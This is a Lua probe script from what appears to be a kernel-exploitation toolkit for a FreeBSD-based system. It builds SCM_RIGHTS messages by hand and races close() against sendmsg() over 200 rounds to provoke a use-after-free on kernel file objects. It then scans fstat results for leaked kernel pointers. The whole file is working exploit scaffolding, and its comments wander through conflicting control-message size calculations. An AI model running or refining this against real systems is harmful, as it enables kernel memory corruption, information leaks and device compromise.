-- CRASH_CLASS: HIGH
-- PROBE 137a: SCM_RIGHTS fd-passing race
--
-- Race: Thread A sends fd via SCM_RIGHTS on unix socketpair while
-- Thread B closes the same fd. If close wins, the receiver gets a
-- dangling file reference = kernel UAF on struct file.
--
-- Phase 1: Confirm sendmsg/recvmsg with SCM_RIGHTS works
-- Phase 2: Threaded close-vs-sendmsg race
-- Phase 3: Verify received fd for corruption indicators

print("=== PROBE 137a: SCM_RIGHTS RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local has_rax = native and native.fcall_with_rax
local stub = has_rax and syscall.pipe.fn_addr or nil
print("has_rax=" .. tostring(has_rax ~= nil))

if not has_rax then
    print("NEED native.fcall_with_rax — aborting")
    print("=== PROBE 137a COMPLETE ===")
    return
end

local thrd_create_fn = fcall(libc_addrofs.Thrd_create)
local thrd_join_fn = fcall(libc_addrofs.Thrd_join)
local atomic_fn = libc_addrofs.Atomic_fetch_add_8

-- Constants
local AF_UNIX = 1
local SOCK_STREAM = 1
local SOL_SOCKET = 0xFFFF
local SCM_RIGHTS = 1

-- ============================================================
-- PHASE 1: SCM_RIGHTS basic test
-- ============================================================
print("")
print("--- PHASE 1: SCM_RIGHTS BASIC ---")

-- Create unix socketpair
local pair_buf = memory.alloc(16)
safe_wq(pair_buf, uint64(0))
local sp_ret = to_num(native.fcall_with_rax(stub, 135, AF_UNIX, SOCK_STREAM, 0, to_num(pair_buf)))
local fd_s = safe_rd(pair_buf)       -- sender
local fd_r = safe_rd(pair_buf + 4)   -- receiver
print("socketpair ret=" .. sp_ret .. " fds=" .. (fd_s or "nil") .. "," .. (fd_r or "nil"))

if sp_ret ~= 0 or not fd_s or not fd_r then
    print("socketpair failed — aborting")
    print("=== PROBE 137a COMPLETE ===")
    return
end

-- Create a target fd to send (a UDP socket)
local target_fd = to_num(native.fcall_with_rax(stub, 97, 2, 2, 17))
print("target fd=" .. target_fd)

-- Build msghdr + cmsg for sendmsg with SCM_RIGHTS
-- struct msghdr {
--   void *msg_name;        +0x00 (8)
--   socklen_t msg_namelen; +0x08 (4) + pad
--   struct iovec *msg_iov; +0x10 (8)
--   int msg_iovlen;        +0x18 (4) + pad
--   void *msg_control;     +0x20 (8)
--   socklen_t msg_controllen; +0x28 (4) + pad
--   int msg_flags;         +0x30 (4)
-- }
-- Total: 0x38

-- struct cmsghdr {
--   socklen_t cmsg_len;    +0x00 (4)
--   int cmsg_level;        +0x04 (4)
--   int cmsg_type;         +0x08 (4)
--   // data follows at +0x0C (CMSG_DATA)
-- }
-- For SCM_RIGHTS with 1 fd: cmsg_len = 16 (12 header + 4 fd)
-- But on FreeBSD 64-bit: CMSG_LEN(sizeof(int)) = CMSG_ALIGN(sizeof(cmsghdr)) + sizeof(int)
-- sizeof(cmsghdr) on amd64 = 12, CMSG_ALIGN(12) = 16 (align to 8)
-- So cmsg_len = 16 + 4 = 20? No: cmsg_len includes the header
-- Actually: cmsg_len = sizeof(cmsghdr) + datalen = 12 + 4 = 16
-- CMSG_SPACE = CMSG_ALIGN(16) = 16

local CMSG_HDR_SIZE = 12  -- sizeof(struct cmsghdr) on amd64 = 12? Actually it's padded
-- On FreeBSD amd64: sizeof(struct cmsghdr) = 12
-- CMSG_ALIGN rounds up to 8-byte boundary
-- CMSG_LEN(4) = CMSG_ALIGN(12) + 4 = 16 + 4 = 20...
-- Let me use the standard: cmsg_len = 16 (header=12 + fd=4), total space = 16 padded to 16

-- Actually FreeBSD: CMSG_ALIGN(x) = ((x)+3) & ~3 on 32-bit, ((x)+7) & ~7 on 64-bit
-- sizeof(cmsghdr) = 12 on both. CMSG_ALIGN(12) = 16 on 64-bit
-- CMSG_LEN(datalen) = CMSG_ALIGN(sizeof(cmsghdr)) + datalen = 16 + datalen
-- CMSG_SPACE(datalen) = CMSG_ALIGN(CMSG_LEN(datalen)) = CMSG_ALIGN(16 + datalen)
-- For 1 int (4 bytes): CMSG_LEN = 20, CMSG_SPACE = CMSG_ALIGN(20) = 24

local CMSG_LEN_1FD = 20   -- CMSG_ALIGN(12) + 4 = 16 + 4
local CMSG_SPACE_1FD = 24  -- CMSG_ALIGN(20) = 24

local cmsg = memory.alloc(CMSG_SPACE_1FD + 16)
safe_wd(cmsg + 0, CMSG_LEN_1FD)    -- cmsg_len
safe_wd(cmsg + 4, SOL_SOCKET)       -- cmsg_level
safe_wd(cmsg + 8, SCM_RIGHTS)       -- cmsg_type
safe_wd(cmsg + 16, target_fd)       -- CMSG_DATA: the fd (at CMSG_ALIGN(12)=16)

-- iovec for a dummy byte
local iov_data = memory.alloc(8)
safe_wd(iov_data, 0x42)  -- dummy byte

local iov = memory.alloc(16)
safe_wq(iov, uint64(to_num(iov_data)))      -- iov_base
safe_wq(iov + 8, uint64(1))                  -- iov_len = 1

-- msghdr
local msg = memory.alloc(0x40)
safe_wq(msg + 0x00, uint64(0))               -- msg_name = NULL
safe_wd(msg + 0x08, 0)                        -- msg_namelen = 0
safe_wq(msg + 0x10, uint64(to_num(iov)))     -- msg_iov
safe_wd(msg + 0x18, 1)                        -- msg_iovlen = 1
safe_wq(msg + 0x20, uint64(to_num(cmsg)))    -- msg_control
safe_wd(msg + 0x28, CMSG_SPACE_1FD)          -- msg_controllen
safe_wd(msg + 0x30, 0)                        -- msg_flags = 0

-- sendmsg(fd_s, msg, 0)
local send_ret = to_num(native.fcall_with_rax(stub, 28, fd_s, to_num(msg), 0))
print("sendmsg ret=" .. send_ret)

-- recvmsg on receiver
local recv_cmsg = memory.alloc(CMSG_SPACE_1FD + 16)
safe_wq(recv_cmsg, uint64(0))

local recv_iov_data = memory.alloc(8)
local recv_iov = memory.alloc(16)
safe_wq(recv_iov, uint64(to_num(recv_iov_data)))
safe_wq(recv_iov + 8, uint64(1))

local recv_msg = memory.alloc(0x40)
safe_wq(recv_msg + 0x00, uint64(0))
safe_wd(recv_msg + 0x08, 0)
safe_wq(recv_msg + 0x10, uint64(to_num(recv_iov)))
safe_wd(recv_msg + 0x18, 1)
safe_wq(recv_msg + 0x20, uint64(to_num(recv_cmsg)))
safe_wd(recv_msg + 0x28, CMSG_SPACE_1FD + 16)
safe_wd(recv_msg + 0x30, 0)

-- recvmsg(fd_r, recv_msg, 0)
local recv_ret = to_num(native.fcall_with_rax(stub, 27, fd_r, to_num(recv_msg), 0))
print("recvmsg ret=" .. recv_ret)

-- Check received cmsg
local rcv_len = safe_rd(recv_cmsg + 0)
local rcv_level = safe_rd(recv_cmsg + 4)
local rcv_type = safe_rd(recv_cmsg + 8)
local rcv_fd = safe_rd(recv_cmsg + 16)  -- CMSG_DATA offset
print(string.format("cmsg: len=%d level=0x%X type=%d fd=%d",
    rcv_len or 0, rcv_level or 0, rcv_type or 0, rcv_fd or -1))

local scm_works = (send_ret == 1 and recv_ret == 1 and rcv_fd and rcv_fd >= 0)
print("SCM_RIGHTS works: " .. tostring(scm_works))

-- Cleanup test fds
if rcv_fd and rcv_fd >= 0 then
    native.fcall_with_rax(stub, 6, rcv_fd)
end
native.fcall_with_rax(stub, 6, target_fd)

print("canary1: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- ============================================================
-- PHASE 2: Close-vs-sendmsg race
-- ============================================================
print("")
print("--- PHASE 2: CLOSE vs SENDMSG RACE ---")

if not scm_works then
    print("SCM_RIGHTS not working — trying alternative cmsg layout")
    -- Try with cmsg_len = 16 (no CMSG_ALIGN padding)
    safe_wd(cmsg + 0, 16)
    safe_wd(cmsg + 12, target_fd)  -- fd right after header at +12
    safe_wd(msg + 0x28, 16)
    local alt_ret = to_num(native.fcall_with_rax(stub, 28, fd_s, to_num(msg), 0))
    print("sendmsg (alt layout) ret=" .. alt_ret)
    if alt_ret <= 0 then
        print("SCM_RIGHTS not functional — aborting race")
        native.fcall_with_rax(stub, 6, fd_s)
        native.fcall_with_rax(stub, 6, fd_r)
        print("=== PROBE 137a COMPLETE ===")
        return
    end
end

local RACE_ROUNDS = 200
local uaf_indicators = 0

for round = 1, RACE_ROUNDS do
    -- Create fresh target fd
    local tgt = to_num(native.fcall_with_rax(stub, 97, 2, 2, 17))  -- UDP socket
    if tgt < 0 then print("round " .. round .. ": socket fail"); break end

    -- Prepare cmsg with target fd
    safe_wd(cmsg + 0, CMSG_LEN_1FD)
    safe_wd(cmsg + 4, SOL_SOCKET)
    safe_wd(cmsg + 8, SCM_RIGHTS)
    safe_wd(cmsg + 16, tgt)

    -- Launch thread: atomic_add on a counter (generates scheduling noise)
    -- We want the kernel to context-switch between our close and sendmsg
    local noise = memory.alloc(8)
    safe_wq(noise, uint64(0))
    local thr = memory.alloc(8)
    safe_wq(thr, uint64(0))
    if atomic_fn then
        pcall(thrd_create_fn, thr, atomic_fn, uint64(to_num(noise)))
    end

    -- RACE: close target fd, then immediately sendmsg with it
    native.fcall_with_rax(stub, 6, tgt)  -- close
    local sr = to_num(native.fcall_with_rax(stub, 28, fd_s, to_num(msg), 0))  -- sendmsg

    -- Receive whatever was sent
    safe_wq(recv_cmsg, uint64(0))
    safe_wq(recv_cmsg + 8, uint64(0))
    safe_wq(recv_cmsg + 16, uint64(0))
    safe_wd(recv_msg + 0x28, CMSG_SPACE_1FD + 16)

    local rr = to_num(native.fcall_with_rax(stub, 27, fd_r, to_num(recv_msg), 0))

    if rr > 0 then
        local got_fd = safe_rd(recv_cmsg + 16)
        if got_fd and got_fd >= 0 then
            -- We received an fd that was already closed = potential dangling ref
            -- Try fstat on it to see if it's corrupted
            local stat_buf = memory.alloc(256)
            safe_wq(stat_buf, uint64(0))
            local fstat_ret = to_num(native.fcall_with_rax(stub, 189, got_fd, to_num(stat_buf)))

            if fstat_ret == 0 then
                -- Check for kernel pointers in stat buf
                for off = 0, 240, 8 do
                    local v = safe_rq(stat_buf + off)
                    if is_kptr(v) then
                        uaf_indicators = uaf_indicators + 1
                        print(string.format("round %d: KPTR at stat+%d: %s", round, off, fmt_addr(v)))
                    end
                end
            end

            native.fcall_with_rax(stub, 6, got_fd)
        end
    end

    -- Join thread
    if atomic_fn then
        sleep(0.005, 's')
        pcall(thrd_join_fn, memory.read_qword(thr), uint64(0))
    end

    if round % 50 == 0 then
        local ok = pcall(function() return to_num(syscall.getpid()) end)
        if not ok then
            print("*** CRASH at round " .. round .. " ***")
            break
        end
        print("  progress: " .. round .. "/" .. RACE_ROUNDS .. " uaf=" .. uaf_indicators)
    end
end

print("Total UAF indicators: " .. uaf_indicators)

-- Cleanup
native.fcall_with_rax(stub, 6, fd_s)
native.fcall_with_rax(stub, 6, fd_r)

print("")
print("canary_final: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
print("=== PROBE 137a COMPLETE ===")
